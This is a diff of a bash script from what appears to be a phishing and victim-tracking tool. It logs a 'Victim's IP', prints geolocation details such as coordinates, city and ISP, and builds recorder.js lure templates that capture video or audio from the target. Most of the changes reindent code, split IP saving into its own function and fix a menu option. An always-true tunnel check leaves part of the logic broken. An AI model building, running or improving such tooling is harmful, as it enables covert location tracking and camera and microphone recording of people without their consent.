@@ -480,13 +480,17 @@ capture_ip() {
         IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
         IFS=$'\n'
         echo -e "\n${RED} Victim's IP : ${RED}$IP"
+				echo -e " "
 	if [ reply_tunnel=1 ]; then
 		echo -ne "${RED} IP details cannot be captured in localhost server"
 	elif [ reply_tunnel=01 ]; then
 		echo -ne "${RED} IP details cannot be captured in localhost server"
 	else
 		ip_details
+		save_ip
 	fi
+}
+save_ip() {
 	logs_full_dir="${files_dir}/${site_name}/${logs_dir}"
 	if [ -d ${files_dir}/${site_name}/${logs_dir} ]; then
 		cat .server/www/ip.txt >> ${logs_full_dir}/ip.txt
@@ -496,8 +500,7 @@ capture_ip() {
 		mv ${logs_dir} ${files_dir}/${site_name}
 		mv .server/www/ip.txt ${logs_full_dir}
 	fi
-        echo -ne "\n${BLUE} IP Details Saved in : ${GREEN} ${logs_full_dir}"
-
+				echo -ne "\n${BLUE} IP Details Saved in : ${GREEN} ${logs_full_dir}"
 }
 ip_details() {
 	IFS='\n'
@@ -506,55 +509,55 @@ ip_details() {
 	iptt=$(sed -n 's/"ip"://p' track.txt)
 
 	if [[ $iptt != "" ]]; then
-	echo -e  "\n${GREEN} Device ip: ${NC} $iptt"
+		echo -e  "\n${GREEN} Device ip: ${NC} $iptt"
 	fi
 	iptype=$(sed -n 's/"type"://p' track.txt)
 	if [[ $iptype != "" ]]; then
-	echo -e "\n${GREEN} IP type: ${NC} $iptype"
+		echo -e "\n${GREEN} IP type: ${NC} $iptype"
 	fi
 	latitude=$(sed -n 's/"latitude"://p' track.txt)
 	if [[ $latitude != "" ]]; then
-	echo -e  "\n${GREEN} Latitude:  ${NC} $latitude"
+		echo -e  "\n${GREEN} Latitude:  ${NC} $latitude"
 	fi
 	longitude=$(sed -n 's/"longitude"://p' track.txt)
 	if [[ $longitude != "" ]]; then
-	echo -e  "\n${GREEN} Longitude:  ${NC} $longitude"
+		echo -e  "\n${GREEN} Longitude:  ${NC} $longitude"
 	fi
 	city=$(sed -n 's/"city"://p' track.txt)
 	if [[ $city != "" ]]; then
-	echo -e "\n${GREEN} City: ${NC} $city"
+		echo -e "\n${GREEN} City: ${NC} $city"
 	fi
 	isp=$(sed -n 's/"isp"://p' track.txt)
 	if [[ $isp != "" ]]; then
-	echo -e "\n${GREEN} Isp: ${NC} $isp"
+		echo -e "\n${GREEN} Isp: ${NC} $isp"
 	fi
 	country=$(sed -n 's/"country"://p' track.txt)
 	if [[ $country != "" ]]; then
-	echo -e  "\n${GREEN} Country: ${NC} $country"
+		echo -e  "\n${GREEN} Country: ${NC} $country"
 	fi
 	flag=$(sed -n 's/"country_flag"://p' track.txt)
 	if [[ $flag != "" ]]; then
-	echo -e "\n${GREEN} Country flag: ${NC} $flag"
+		echo -e "\n${GREEN} Country flag: ${NC} $flag"
 	fi
 	cap=$(sed -n 's/"country_capital"://p' track.txt)
 	if [[ $cap != "" ]]; then
-	echo -e "\n${GREEN} Country capital: ${NC} $cap"
+		echo -e "\n${GREEN} Country capital: ${NC} $cap"
 	fi
 	phon=$(sed -n 's/"country_phone"://p' track.txt)
 	if [[ $phon != "" ]]; then
-	echo -e "\n${GREEN} Country code: ${NC} $phon"
+		echo -e "\n${GREEN} Country code: ${NC} $phon"
 	fi
 	continent=$(sed -n 's/"continent"://p' track.txt)
 	if [[ $continent != "" ]]; then
-	echo -e  "\n${GREEN} Continent:  ${NC} $continent"
+		echo -e  "\n${GREEN} Continent:  ${NC} $continent"
 	fi
 	ccode=$(sed -n 's/"currency_code"://p' track.txt)
 	if [[ $ccode != "" ]]; then
-	echo -e "\n${GREEN} Currency code: ${NC} $ccode"
+		echo -e "\n${GREEN} Currency code: ${NC} $ccode"
 	fi
 	region=$(sed -n 's/"region"://p' track.txt)
 	if [[ $region != "" ]]; then
-	echo -e "\n${GREEN} State: ${NC} $region"
+		echo -e "\n${GREEN} State: ${NC} $region"
 	fi
 }
 
@@ -652,7 +655,7 @@ case $reply_site in
 	3 | 03)
 		site_name=video
                 site_video;;
-	3 | 03)
+	4 | 04)
 		site_name=video
 		site_video_audio;;
 	A | a)
@@ -831,8 +834,9 @@ case $reply_template in
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                 { sleep 1; banner; site_video; };;
 esac
-rm -rf ${sites_dir}/video/${site_template}/recorder.js
-sed "s+mediaType+"$type"+g" ${sites_dir}/video/${site_template}/template.js | sed "s+recordingTime+"$duration"+g" > ${sites_dir}/video/${site_template}/recorder.js
+cd ${sites_dir}/video/${site_template}
+sed "s+mediaType+"$type"+g" template.js | sed "s+recordingTime+"$duration"+g" > recorder.js
+cd ${pro_dir}
 }
 
 site_video_audio(){
@@ -869,8 +873,9 @@ case $reply_template in
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                 { sleep 1; banner; site_video; };;
 esac
-rm -rf ${sites_dir}/video/${site_template}/recorder.js
-sed "s+mediaType+"$type"+g" ${sites_dir}/video/${site_template}/template.js | sed "s+recordingTime+"$duration"+g" > ${sites_dir}/video/${site_template}/recorder.js
+cd ${sites_dir}/video/${site_template}
+sed "s+mediaType+"$type"+g" template.js | sed "s+recordingTime+"$duration"+g" > recorder.js
+cd ${pro_dir}
 }
 
 clear
